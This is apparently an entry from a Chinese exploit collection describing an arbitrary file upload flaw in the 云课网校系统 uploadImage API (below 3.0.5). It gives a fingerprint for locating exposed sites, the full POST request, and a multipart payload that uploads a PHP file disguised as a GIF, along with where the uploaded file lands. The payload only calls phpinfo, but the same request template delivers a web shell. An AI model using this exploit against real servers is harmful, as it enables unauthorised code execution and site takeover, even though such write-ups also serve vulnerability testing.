# 云课网校系统uploadImage存在任意文件上传漏洞

- **系统**：云课网校系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/static/libs/common/jquery.stickyNavbar.min.js"`
- **请求**：`POST /api/uploader/uploadImage HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DIn…`　`x-requested-with: XMLHttpRequest`

**请求体 / payload**
```
------WebKitFormBoundaryLZbmKeasWgo2gPtU
Content-Disposition: form-data; name="file"; filename="1G3311040N.php"
Content-Type: image/gif
<?php phpinfo();?>
------WebKitFormBoundaryLZbmKeasWgo2gPtU--

上传文件位置
/upload/image/20231206/10f4784dc45961c0dc43cfdf3dd5fa75.php
```

**其他**
- 云课网校系统uploadImage存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * <云课网校系统3.0.5